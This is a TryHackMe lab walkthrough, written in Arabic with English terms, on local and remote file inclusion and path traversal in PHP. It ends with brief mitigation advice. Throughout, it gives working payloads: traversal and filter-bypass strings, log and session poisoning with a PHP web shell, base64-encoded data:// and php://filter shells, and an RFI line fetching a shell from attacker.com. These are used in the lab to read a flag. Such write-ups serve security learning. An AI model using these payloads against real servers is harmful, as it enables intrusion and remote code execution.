# TryHackMe File Inclusion, Path Traversal walkthrough


<img width="1907" height="591" alt="image" src="https://github.com/user-attachments/assets/213367c0-c9a7-4b76-9e55-0af07675fac1" />


----

<details>
  <summary>Web Application Architecture</summary>


💡 1. Structure of Web Application
----------------------------------

أي ويب أبليكيشن بيتكوّن من جزئين أساسيين:

-   **Frontend (اللي المستخدم بيشوفه)**\
    HTML + CSS + JS (React / Vue / Angular)\
    👉 ده مجرد واجهة، مفيش داتا حساسة هنا
-   **Backend (المخ)**\
    PHP / Python / Node.js\
    👉 هو اللي:
    -   يعالج الريكوست
    -   يتعامل مع الداتابيز
    -   يقرأ ملفات من السيرفر

* * * * *

🔁 2. Client-Server Model
-------------------------

-   المستخدم (Browser) يبعت Request
-   السيرفر يعالج ويرد Response

مثال:

```
GET /index.php?page=home
```

* * * * *

⚠️ 3. المشكلة بتيجي منين؟
-------------------------

لما التطبيق يعمل حاجة زي:

```
include($_GET['page']);
```

👈 هنا الكارثة 💀\
لأنك بتتحكم في `page`

* * * * *

💥 4. LFI (Local File Inclusion)
--------------------------------

تستغلها كده:

```
?page=../../../../etc/passwd
```

👉 السيرفر يقرأ ملف من الجهاز نفسه\
👉 تقدر تشوف:

-   users
-   paths
-   system info

* * * * *

🔥 5. ليه الموضوع أخطر من كده؟
------------------------------

مش بس قراءة ملفات 👇

### 1\. قراءة بيانات حساسة

-   config files
-   database credentials

* * * * *

### 2\. Path Traversal

تلعب في الـ path:

```
../../../../
```

* * * * *

### 3\. تحويلها لـ RCE (الأهم 💀🔥)

#### الفكرة:

-   تحقن كود في log file:

```
User-Agent: <?php system($_GET['cmd']); ?>
```

-   بعد كده تعمل include للـ log:

```
?page=/var/log/apache2/access.log&cmd=whoami
```

👉 بقى عندك **Remote Code Execution**

* * * * *

⚠️ 6. ليه ده بيحصل؟
-------------------

-   مفيش validation للـ input
-   مفيش filtering
-   Error messages بتفضح paths



  
</details>






<details>
  <summary>File Inclusion Types</summary>



🧠 1. Traversal String (أهم حاجة)
---------------------------------

```
../
```

👉 دي معناها: اطلع فولدر لفوق

مثال:

```
?page=../../../../etc/passwd
```

👉 كده بتخرج برا الفولدر الأساسي وتقرأ ملفات سيستم 💀

* * * * *

📂 2. Relative vs Absolute Path
-------------------------------

### ✅ Relative Path

```
./folder/file.php
```

👉 من مكانك الحالي

* * * * *

### ✅ Absolute Path

```
/var/www/html/file.php
```

👉 من root بتاع السيستم مباشرة

* * * * *

🔥 3. LFI (Local File Inclusion)
--------------------------------

👉 بتستخدمه عشان:

-   تقرأ ملفات من السيرفر
-   تستكشف السيستم

### مثال:

```
?page=../../../../etc/passwd
```

💡 الهدف:

-   users
-   config files
-   paths

* * * * *

🌍 4. RFI (Remote File Inclusion)
---------------------------------

👉 هنا بتجيب ملف من بره السيرفر

### مثال:

```
?page=http://attacker.com/shell.php
```

💀 لو اشتغلت → مباشرة RCE\
(نفذت كود من عندك على السيرفر)

* * * * *

⚔️ 5. الفرق بينهم (أهم نقطة)
----------------------------

| LFI | RFI |
| --- | --- |
| Local files | Remote files |
| قراءة ملفات | تنفيذ كود مباشرة |
| محتاج تشتغل شوية عشان توصل لـ RCE | RCE على طول 🔥 |

* * * * *

💀 6. إزاي LFI تتحول لـ RCE؟
----------------------------

### أشهر تكنيك: Log Poisoning

1.  تحقن كود:

```
User-Agent: <?php system($_GET['cmd']); ?>
```

1.  السيرفر يسجله في:

```
/var/log/apache2/access.log
```

1.  تعمل include:

```
?page=/var/log/apache2/access.log&cmd=id
```

🔥 بقى عندك command execution


<img width="1265" height="333" alt="image" src="https://github.com/user-attachments/assets/1d76f851-a18b-470a-8c26-9dab9f04010d" />



  
</details>





<details>
  <summary>PHP Wrappers</summary>



💡 يعني إيه PHP Wrappers؟
-------------------------

دي طرق خاصة في PHP تخلّيك تتعامل مع الملفات/الداتا بشكل غير عادي

👉 بدل ما تقرأ ملف عادي:

```
/etc/passwd
```

تقدر تقرأه بـ "طريقة خاصة" زي:

```
php://filter/...
```

* * * * *

🔥 1. أخطر Wrapper → `php://filter`
-----------------------------------

### الفكرة:

تقرأ الملف **بس بشكل متحوّل** (مثلاً encode)

### أشهر Payload:

```
php://filter/convert.base64-encode/resource=/etc/passwd
```

👉 السيرفر يرجعلك الملف **مشفر base64**\
👉 إنت تفكه بسهولة وتشوف المحتوى 💀

* * * * *

😏 ليه ده مهم؟
--------------

في بعض المواقع:

-   تمنع قراءة الملفات مباشرة ❌
-   لكن تسمح بالـ wrappers ✅

👉 فتلف عليهم وتجيب الداتا برضه

* * * * *

🧪 Filters مهمة تحفظها:
-----------------------

### 🔹 تحويل (الأهم)

-   `convert.base64-encode` 🔥
-   `convert.base64-decode`

* * * * *

### 🔹 تعديل نص

-   `string.toupper`
-   `string.tolower`
-   `string.rot13`


|   |   |
|---|---|
|**Payload**|**Output**|
|php://filter/convert.base64-encode/resource=.htaccess|UmV3cml0ZUVuZ2luZSBvbgpPcHRpb25zIC1JbmRleGVz|
|php://filter/string.rot13/resource=.htaccess|ErjevgrRatvar ba Bcgvbaf -Vaqrkrf|
|php://filter/string.toupper/resource=.htaccess|REWRITEENGINE ON OPTIONS -INDEXES|
|php://filter/string.tolower/resource=.htaccess|rewriteengine on options -indexes|
|php://filter/string.strip_tags/resource=.htaccess|RewriteEngine on Options -Indexes|
|No filter applied|RewriteEngine on Options -Indexes|




👉 دي أقل أهمية بس ممكن تستخدمها في bypass

* * * * *

💀 2. data:// Wrapper (أخطر بقى)
--------------------------------

### الفكرة:

تحقن كود PHP **جوا الريكوست نفسه**

### Payload:

```
data:text/plain,<?php phpinfo(); ?>
```

👉 السيرفر ينفذ الكود 😳\
👉 دي = **RCE مباشر**

* * * * *

🧠 بتشتغل إمتى؟
---------------

لما:

-   يكون في LFI
-   والسيرفر بيسمح بـ wrappers
-   ومفيش filtering قوي

* * * * *

⚔️ الخلاصة اللي تمشي بيها في أي lab:
------------------------------------

### لو عندك LFI:

1.  جرّب:

```
/etc/passwd
```

1.  لو مش ظاهر:

```
php://filter/convert.base64-encode/resource=FILE
```

1.  لو عايز RCE:

```
data://text/plain,<?php system($_GET['cmd']); ?>
```

<details>
  <summary>details about Data://text</summary>

🧠 أول حاجة: تكتب الـ payload فين؟
----------------------------------

بتحطه في **الـ parameter اللي فيه LFI**\
زي:

```
http://target.com/playground.php?page=HERE
```

👉 بدل `HERE` تحط الـ payload

* * * * *

💥 مثال مباشر:
--------------

```
http://target.com/playground.php?page=data:text/plain,<?php phpinfo(); ?>
```

* * * * *

⚠️ بس استنى! مش دايمًا هيشتغل
-----------------------------

عشان يشتغل لازم:

### ✅ شروط النجاح:

-   الموقع فيه **LFI أصلاً**
-   بيستخدم:

```
include($_GET['page']);
```

-   مفيش filtering على `data://`
-   `allow_url_include = On` في PHP

* * * * *

🔥 طيب أجيب RCE إزاي فعليًا؟
----------------------------

بدل `phpinfo()` استخدم command execution:

```
data:text/plain,<?php system($_GET['cmd']); ?>
```

* * * * *

💀 وبعدها تنفذ أوامر كده:
-------------------------

```
http://target.com/playground.php?page=data:text/plain,<?php system($_GET['cmd']); ?>&cmd=whoami
```

أو:

```
&cmd=id
```

* * * * *

🧪 لو ما اشتغلش؟
----------------

جرب alternatives 👇

### 1\. URL Encode (مهم جدًا)

```
data:text/plain,%3C?php%20system($_GET['cmd']);%20?%3E
```

* * * * *

### 2\. استخدم php://filter بدلها (للقراءة)

```
php://filter/convert.base64-encode/resource=index.php
```

* * * * *

### 3\. استخدم log poisoning (الأقوى غالبًا)

لو `data://` متقفلة

  
</details>





<img width="1346" height="219" alt="image" src="https://github.com/user-attachments/assets/f96f05df-de04-4bb2-ac8e-94b88acf5781" />







  
</details>





<details>
  <summary>Base Directory Breakouts</summary>




💡 1. الفكرة العامة (Base Directory Protection)
-----------------------------------------------

الكود بيحاول يمنعك تطلع برا:

```
/var/www/html
```

وبيعمل شرطين:

1.  ❌ يمنع `../..`
2.  ✅ لازم الباث يحتوي `/var/www/html`

* * * * *

💀 المشكلة فين؟
---------------

الفلترة **ضعيفة جدًا (string match بس)**\
مش فاهمة إن فيه طرق تانية لنفس المعنى

* * * * *

🔥 2. البايباس الأساسي (أهم نقطة)
---------------------------------

بدل:

```
../../
```

استخدم:

```
..//..//
```

### مثال:

```
/var/www/html/..//..//..//etc/passwd
```

👉 السيرفر يشوف:

-   فيه `/var/www/html` ✅
-   مفيش `../..` بالظبط ❌

👉 يعدي 😏\
👉 بس فعليًا يطلع لفوق في الديركتوري 💀

* * * * *

🧠 ليه ده شغال؟
---------------

لأن:

```
..// = ../
```

👉 السيستم بيتعامل مع `//` كأنها `/` عادي

* * * * *

🕵️‍♂️ 3. Obfuscation (التخفي)
------------------------------

لو الفلترة أقوى شوية، نستخدم tricks 👇

* * * * *

### 🔹 1. URL Encoding

```
../  →  %2e%2e%2f
```

مثال:

```
?page=%2e%2e%2f%2e%2e%2fetc/passwd
```

* * * * *

### 🔹 2. Double Encoding (تقيل 🔥)

```
../ → %252e%252e%252f
```

👉 لو السيرفر بيعمل decode مرتين → هتعدي

* * * * *

### 🔹 3. Obfuscation

```
....//
```

👉 تتحول بعد الفلترة:

```
../
```

💀 bypass نظيف

* * * * *

⚔️ 4. مثال عملي على bypass
--------------------------

الكود:

```
$file = str_replace('../', '', $file);
```

### ❌ هيشيل:

```
../
```

### ✅ بس مش هيشيل:

```
....//
```

👉 تتحول بعد المعالجة:

```
../
```

🔥 دخلت عليه

* * * * *

🧠 الخلاصة التقيلة:
-------------------

-   الفلترة اللي تعتمد على string = سهلة تتكسر
-   دايمًا فكر:\
    👉 "أحقق نفس المعنى بطريقة مختلفة"

* * * * *

💣 Cheat mindset:
-----------------

لو شفت:

-   `../` blocked ❌

جرب:

-   `..//`
-   `%2e%2e%2f`
-   `%252e%252e%252f`
-   `....//`


  
</details>




<details>
  <summary>LF12RCE - Session Files</summary>



💡 الفكرة الأساسية (Session Poisoning)
--------------------------------------

الـ PHP بيخزن الـ **session data في فايلات على السيرفر**\
زي:

```
/var/lib/php/sessions/sess_xxxxxx
```

👉 الفايل ده بيبقى فيه بياناتك (session)

* * * * *

💀 المشكلة هنا
--------------

الكود بيعمل حاجتين خطر:

```
$_SESSION['page'] = $_GET['page'];\
include($_GET['page']);
```

👉 يعني:

1.  بياخد input منك ويحطه في session
2.  وبعدين بيعمل include لنفس الـ input 😳

🔥 كارثة

* * * * *

⚔️ الاستغلال بيتم إزاي؟
-----------------------

### 🧪 Step 1: تحقن كود في session

تحط payload كده:

```
?page=<?php phpinfo(); ?>
```

👉 الكود ده يتخزن جوا session file

* * * * *

### 🧪 Step 2: تجيب session ID

من الكوكيز:

```
PHPSESSID=abc123
```

* * * * *

### 🧪 Step 3: تعمل include للـ session file

```
?page=/var/lib/php/sessions/sess_abc123
```

👉 السيرفر يفتح الفايل\
👉 يلاقي جواه:

```
<?php phpinfo(); ?>
```

💀 وينفذه = RCE

* * * * *

🔥 عايز command execution؟
--------------------------

بدل:

```
<?php phpinfo(); ?>
```

استخدم:

```
<?php system($_GET['cmd']); ?>
```

* * * * *

### وبعدها:

```
?page=/var/lib/php/sessions/sess_abc123&cmd=whoami
```

🔥 كده بتنفذ أوامر

* * * * *

🧠 ليه دي شغالة؟
----------------

-   session file بيتخزن كنص
-   include بيشغّل أي PHP جواه
-   انت اتحكمت في محتواه

👉 يبقى كأنك رفعت shell 💀

* * * * *

⚠️ شروط النجاح:
---------------

-   فيه LFI
-   السيرفر بيخزن sessions في files
-   تقدر تتحكم في session data
-   تعرف path بتاع sessions

* * * * *

🧠 الخلاصة التقيلة:
-------------------

-   دي اسمها: **Session Poisoning**
-   بتحقن كود في session
-   وبعدين تعمل include له
-   = **RCE بطريقة نظيفة 🔥**

* * * * *

💣 فاينال تيك:
--------------

لو `data://` و `log poisoning` مش شغالين\
👉 جرّب **session poisoning** فورًا 😏


<details>
  <summary>how to konw if my input sored in session files⚠️</summary>


### ✅ علامة قوية جدًا:

لو لقيت:

```
PHPSESSID=xxxx
```

👉 يبقى فيه sessions\
👉 غالبًا متخزنة في files

* * * * *

🧪 3. تجرب عملي (أفضل طريقة 💀)
-------------------------------

### Step 1: حط payload مميز

```
?page=TEST123
```

* * * * *

### Step 2: جرّب تعمل include للـ session file

```
?page=/var/lib/php/sessions/sess_YOURSESSIONID
```

👉 لو لقيت:

```
TEST123
```

🔥 يبقى confirmed\
👉 input بتاعك اتخزن في session

  
</details>





  
</details>







<details>
  <summary>LF12RCE - Log Poisoning</summary>



💡 الفكرة ببساطة (Log Poisoning)
--------------------------------

السيرفر بيعمل **logs** لكل request\
👉 زي:

-   URL
-   User-Agent
-   Referrer

📁 وتتخزن في:

```
/var/log/apache2/access.log
```

* * * * *

💀 الفكرة الهجومية
------------------

بدل ما تبعت request عادي...\
👉 تبعت request فيه **PHP code**

👉 السيرفر يسجله في الـ log\
👉 بعد كده تعمل include للـ log بـ LFI\
👉 الكود يتنفذ 💀🔥

* * * * *

⚔️ الاستغلال خطوة خطوة
----------------------

* * * * *

### 🧪 Step 1: تحقن كود في الـ log

أسهل طريقة: **User-Agent**

مثال:

```
User-Agent: <?php system($_GET['cmd']); ?>
```

👉 استخدم:

-   Burp Suite (أحسن حاجة)
-   أو curl

* * * * *

### 🧪 Step 2: السيرفر يسجل الطلب

الكود بتاعك يتخزن في:

```
/var/log/apache2/access.log
```

* * * * *

### 🧪 Step 3: تعمل LFI على log file

```
?page=/var/log/apache2/access.log
```

👉 السيرفر يفتح الفايل\
👉 يلاقي PHP code\
👉 ينفذه 💀

* * * * *

### 🔥 Step 4: تنفذ أوامر

```
?page=/var/log/apache2/access.log&cmd=whoami
```

أو:

```
&cmd=id
```

* * * * *

🧠 ليه دي شغالة؟
----------------

-   السيرفر بيخزن logs كنص
-   include بيشغل أي PHP
-   انت اتحكمت في log → بقيت shell 😏

* * * * *

🧪 طرق injection تانية:
-----------------------

### 🔹 URL نفسه

```
GET /<?php system($_GET['cmd']); ?>
```

* * * * *

### 🔹 Referrer header

* * * * *

### 🔹 Netcat (زي المثال)

<details>
  <summary>log poising use netcat</summary>


💡 يعني إيه Netcat في الموضوع ده؟
---------------------------------

Netcat (`nc`) أداة بتخليك **تبعت raw request للسيرفر بإيدك**\
👉 يعني مش browser ولا Burp\
👉 إنت بتتحكم في كل حاجة بنفسك

* * * * *

⚔️ ليه نستخدمه في Log Poisoning؟
--------------------------------

لأنك تقدر تبعت request غريبة أو malformed\
👉 السيرفر يسجلها في الـ log\
👉 حتى لو فيها PHP code 💀

* * * * *

🧪 المثال اللي شوفته:
---------------------

```
nc MACHINE_IP 80
<?php echo phpinfo(); ?>
```

* * * * *

🧠 إيه اللي حصل هنا؟
--------------------

1.  إنت فتحت connection على السيرفر
2.  بعتله كلام مش HTTP request صح ❌
3.  السيرفر قال:

```
400 Bad Request
```

👉 بس قبل ما يرفضه...\
🔥 سجل اللي إنت بعته في الـ log

* * * * *

💀 فين الكود بتاعك؟
-------------------

اتكتب في:

```
/var/log/apache2/access.log
```

* * * * *

🔥 بعد كده تعمل إيه؟
--------------------

تستخدم LFI:

```
?page=/var/log/apache2/access.log
```

👉 السيرفر يفتح الفايل\
👉 يلاقي:

```
<?php  echo  phpinfo(); ?>
```

👉 ينفذه 💀

* * * * *

🧠 طيب ليه دي "advanced"؟
-------------------------

لأن:

-   مش request عادي
-   لازم تبقى فاهم HTTP
-   بتبعت data raw
-   أحيانًا بتستخدمها لما الطرق العادية متشتغلش

* * * * *

😏 مقارنة سريعة:
----------------

| الطريقة | السهولة | الأفضل |
| --- | --- | --- |
| User-Agent | سهلة جدًا ✅ | الأفضل |
| URL injection | سهلة | كويسة |
| Netcat | أصعب شوية 😈 | لما الباقي يفشل |

  
</details>

* * * * *

⚠️ أهم paths تحفظها:
--------------------

```
/var/log/apache2/access.log\
/var/log/apache2/error.log\
/var/log/nginx/access.log\
/var/log/nginx/error.log
```

* * * * *

🚨 مشاكل ممكن تقابلك:
---------------------

-   مفيش permission تقرأ log ❌
-   السيرفر بيعمل sanitize ❌
-   path مختلف ❌

👉 جرب paths مختلفة


























<img width="1223" height="211" alt="image" src="https://github.com/user-attachments/assets/a3b8b2a6-1c54-4d62-a621-be88a7c4ede0" />



  
</details>








<details>
  <summary>LF12RCE - Wrappers</summary>




💡 الفكرة العامة
----------------

إحنا بنستخدم:

-   `php://filter`
-   -   `data://`
-   -   base64

👉 عشان **نحقن كود PHP ويتنفذ** حتى لو فيه فلترة

* * * * *

⚔️ الفكرة خطوة خطوة
-------------------

بدل ما تبعت كود PHP مباشر (ممكن يتمنع) ❌\
👉 بنعمله **encode base64**\
👉 والسيرفر هو اللي يفكه ويشغّله 😏

* * * * *

🧪 1. الكود اللي عايزين ننفذه
-----------------------------

```
<?php  system($_GET['cmd']); echo  'Shell done!'; ?>
```

* * * * *

🔐 2. نحوله base64
------------------

يبقى:

```
PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+
```

* * * * *

💀 3. نبني الـ payload النهائي
------------------------------

```
php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+
```

* * * * *

🧠 إيه اللي بيحصل هنا؟
----------------------

1.  السيرفر يشوف `php://filter`
2.  يطبق `base64-decode`
3.  على data جاية من:

```
data://plain/text,ENCODED_CODE
```

👉 يفك الكود\
👉 يبقى:

```
<?php  system($_GET['cmd']); ?>
```

👉 وينفذه 💀🔥

* * * * *

🔥 4. تنفذ أوامر بقى
--------------------

بعد ما تحط payload في:

```
?page=PAYLOAD
```

تزود:

```
&cmd=whoami
```

مثال كامل:

```
?page=php://filter/convert.base64-decode/resource=data://plain/text,PD9w...&cmd=id
```

* * * * *

⚠️ ملاحظة مهمة جدًا (دي اللي بتوقع ناس كتير)
--------------------------------------------

❌ متحطش `&cmd=` جوه payload

ليه؟\
لأنه:

-   هيتعمله encode
-   هيبقى جزء من base64
-   يبوّظ الكود

👉 لازم يكون برا payload




-----


```
php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+
```

<img width="1560" height="423" alt="image" src="https://github.com/user-attachments/assets/ca398c4f-3d7a-4e8a-9b0f-9c36989898e3" />

```
php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+&cmd=id
```

<img width="1357" height="255" alt="image" src="https://github.com/user-attachments/assets/43b7211b-de1a-414f-9f29-3d1704347e2a" />

```
php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+&cmd=ls -la%20 flags
```

<img width="1360" height="268" alt="image" src="https://github.com/user-attachments/assets/3ee55b48-32f5-408e-b90b-f9baad428067" />

```
php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+&cmd=cat flags/cd3c67e5079de2700af6cea0a405f9cc.txt
```

<img width="1164" height="238" alt="image" src="https://github.com/user-attachments/assets/091c69dd-c8e9-4a71-878a-e69689e98e15" />


  
</details>




<details>
  <summary>Conclusion</summary>



🧠 الخلاصة (Conclusion)
-----------------------

### 💥 المشكلة الأساسية

أي vulnerability من دول بتيجي من:\
👉 **الثقة في input بتاع المستخدم**

* * * * *

### ⚔️ النوعين الأساسيين:

#### 🔹 1. File Inclusion (LFI / RFI)

-   السيرفر بيعمل include لملف
-   إنت تتحكم في اسمه

👉 النتيجة:

-   تقرأ ملفات
-   أو تنفذ كود 💀

* * * * *

#### 🔹 2. Path Traversal

-   تستخدم:

```
../
```

👉 عشان تطلع برا الفولدر المسموح

👉 النتيجة:

-   توصل لملفات حساسة زي:
    -   `/etc/passwd`
    -   config files

* * * * *

💀 الخطر الحقيقي
----------------

الاتنين ممكن يوصلوك لـ:

-   Data Leak 🔓
-   Credentials
-   وفي الآخر: **RCE 🔥 (السيطرة على السيرفر)**

* * * * *

🛡️ الحماية (Mitigation)
------------------------

دي بقى من منظور developer 👇

* * * * *

### ✅ 1. Input Validation

-   متثقش في أي input
-   اعمل filtering + validation

* * * * *

### ✅ 2. Allowlist (الأهم 🔥)

بدل ما تقول:\
❌ "امنع الوحش"

قول:\
✅ "اسمح بس بالحلو"

مثال:

```
$allowed = ['home.php', 'about.php'];
```

* * * * *

### ✅ 3. تعطيل الحاجات الخطرة في PHP

```
allow_url_include = Off\
allow_url_fopen = Off
```

👉 تمنع RFI و wrappers

* * * * *

### ✅ 4. تقليل صلاحيات السيرفر

-   متخليش الويب سيرفر يقرأ كل حاجة
-   حدد permissions صح

* * * * *

### ✅ 5. Code Review + Testing

-   استخدم tools
-   -   manual testing (زي اللي انت بتعمله 😏)

* * * * *

### ✅ 6. Security Awareness

-   الفريق كله يبقى فاهم الأمن
-   مش بس pentester

* * * * *

🧠 الخلاصة التقيلة:
-------------------

> لو المستخدم يقدر يتحكم في path → انت في خطر 💀

* * * * *

🔥 من منظورك كـ Pentester:
--------------------------

أول ما تشوف:

```
?page=\
?file=\
?include=
```

مخك يروح مباشرة لـ:

-   LFI
-   Path Traversal
-   RCE chain 😈

* * * * *

💣 Final Mindset:
-----------------

مش بس تدور على:\
👉 "هل فيه LFI؟"

لكن:\
👉 "أحوّلها لـ RCE إزاي؟"


  
</details>


















































